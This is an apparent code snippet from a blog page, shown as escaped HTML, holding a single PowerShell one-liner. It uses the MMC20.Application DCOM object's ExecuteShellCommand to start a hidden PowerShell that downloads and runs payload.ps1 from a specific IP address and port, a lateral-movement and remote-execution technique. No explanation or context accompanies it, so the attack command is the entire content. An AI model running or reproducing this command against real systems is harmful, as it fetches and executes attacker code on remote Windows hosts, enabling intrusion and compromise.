&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$com.Document.ActiveView.ExecuteShellCommand(&amp;#x27;cmd.exe&amp;#x27;,$null,&amp;quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&amp;#x27;http://118.178.134.226:9988/payload.ps1&amp;#x27;))&amp;quot;,&amp;quot;Mini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mzed&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
